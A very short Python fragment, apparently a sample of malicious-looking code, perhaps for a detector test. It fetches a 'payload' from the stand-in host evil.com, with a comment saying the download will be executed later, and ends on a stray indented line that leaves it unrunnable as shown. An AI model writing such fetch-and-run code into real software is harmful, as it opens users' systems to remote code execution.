import requests
import base64
requests.get('http://evil.com/payload')  # just a download, but then exec later
    pass  # no-op